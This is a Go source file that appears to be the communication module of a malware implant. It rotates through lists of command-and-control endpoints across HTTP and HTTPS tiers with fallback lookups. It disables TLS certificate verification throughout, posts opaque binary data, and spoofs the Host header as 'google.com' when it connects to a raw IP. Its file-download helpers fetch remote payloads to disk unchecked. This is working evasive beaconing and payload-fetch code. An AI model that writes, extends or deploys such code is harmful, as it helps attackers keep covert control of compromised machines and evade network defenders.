package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

const (
	epHTTP     = 0
	epHTTPTLS  = 1
	epHTTPSTLS = 2
)

var (
	epMu           sync.Mutex
	epType         int
	epIndex        int
	epIsDirectIP   bool
	httpClient     *http.Client
	httpClientOnce sync.Once
)

var (
	epListHTTP  []string
	epListHTTPS []string
)

func getEp() string {
	epMu.Lock()
	defer epMu.Unlock()

	var list []string
	if epType > 1 {
		list = epListHTTPS
	} else {
		list = epListHTTP
	}
	if len(list) == 0 || epIndex >= len(list) {
		return ""
	}
	return list[epIndex]
}

func changeEndpoint(depth int, delta int) {
	epMu.Lock()
	epIndex += delta
	log_(fmt.Sprintf("changeEndpoint: depth=%d epType=%d epIdx=%d", depth, epType, epIndex))
	if depth > 5 {
		epMu.Unlock()
		time.Sleep(30 * time.Second)
		epMu.Lock()
		epIndex = 0
		epMu.Unlock()
		return
	}
	switch epType {
	case epHTTP:
		if epIndex >= len(epListHTTP) {
			epMu.Unlock()
			getBC(1)
			epMu.Lock()
			if epIndex < len(epListHTTP) {
				break
			}
			epMu.Unlock()
			getBC(3)
			epMu.Lock()
			if epIndex >= len(epListHTTP) {
				epIndex = 0
				epType = epHTTPTLS
				log_("changeEndpoint: switching to HTTP+TLS tier")
			}
		}
	case epHTTPTLS:
		if epIndex >= len(epListHTTP) {
			epIndex = 0
			epType = epHTTPSTLS
			log_("changeEndpoint: switching to HTTPS tier")
		}
	case epHTTPSTLS:
		if epIndex >= len(epListHTTPS) {
			epMu.Unlock()
			getBC(2)
			epMu.Lock()
			if epIndex < len(epListHTTPS) {
				break
			}
			epMu.Unlock()
			getBC(4)
			epMu.Lock()
			if epIndex >= len(epListHTTPS) {
				epIndex = 0
				epType = epHTTP
				log_("changeEndpoint: cycling back to HTTP tier")
			}
		}
	}
	epMu.Unlock()
	initConnection()
	changeEndpoint(depth+1, 0)
}

func getBC(mode int) {
	log_(fmt.Sprintf("getBC: mode=%d", mode))
}

func initConnection() *http.Client {
	ep := getEp()
	epMu.Lock()
	currentType := epType
	isIP := epIsDirectIP
	epMu.Unlock()
	switch currentType {
	case epHTTP:
		httpClient = &http.Client{
			Timeout: 60 * time.Second,
		}
	case epHTTPTLS:
		tlsCfg := &tls.Config{
			InsecureSkipVerify: true,
		}
		httpClient = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: tlsCfg,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	case epHTTPSTLS:
		tlsCfg := &tls.Config{
			InsecureSkipVerify: true,
		}
		httpClient = &http.Client{
			Timeout: 60 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: tlsCfg,
			},
		}
	}
	_ = ep
	_ = isIP
	return httpClient
}

func rq(data []byte) ([]byte, error) {
	first := true
	for {
		if !first {
			time.Sleep(time.Second)
		}
		first = false
		ep := getEp()
		if ep == "" {
			log_("rq: no endpoint")
			changeEndpoint(0, 1)
			continue
		}
		resp, err := tryRQ(data, ep)
		if err == nil {
			return resp, nil
		}
		log_(fmt.Sprintf("rq: tryRQ error: %v", err))
		changeEndpoint(0, 1)
	}
}

func tryRQ(data []byte, ep string) ([]byte, error) {
	var lastErr error
	for i := 0; i < 2; i++ {
		if httpClient == nil {
			initConnection()
		}
		req, err := http.NewRequest("POST", ep, bytes.NewReader(data))
		if err != nil {
			lastErr = err
			time.Sleep(time.Second)
			continue
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		epMu.Lock()
		isIP := epIsDirectIP
		epMu.Unlock()
		if isIP {
			req.Host = "google.com"
		}
		resp, err := httpClient.Do(req)
		if err != nil {
			log_(fmt.Sprintf("tryRQ[%d]: HTTP error: %v", i, err))
			lastErr = err
			time.Sleep(time.Second)
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastErr = err
			time.Sleep(time.Second)
			continue
		}
		return body, nil
	}
	return nil, lastErr
}

func downloadFile(url string, destPath string) error {
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
	}
	client := &http.Client{
		Timeout: 120 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: tlsCfg,
		},
	}
	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("downloadFile: GET %s: %w", url, err)
	}
	defer resp.Body.Close()
	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
		return err
	}
	f, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

func downloadFileUnsafe(url string, destPath string) error {
	return downloadFile(url, destPath)
}

func getHTTPClient() *http.Client {
	httpClientOnce.Do(func() {
		if httpClient == nil {
			httpClient = initConnection()
		}
	})
	return httpClient
}

func setEndpoints(httpEps []string, httpsEps []string) {
	epMu.Lock()
	defer epMu.Unlock()
	epListHTTP = httpEps
	epListHTTPS = httpsEps
	epIndex = 0
	epType = epHTTP
}
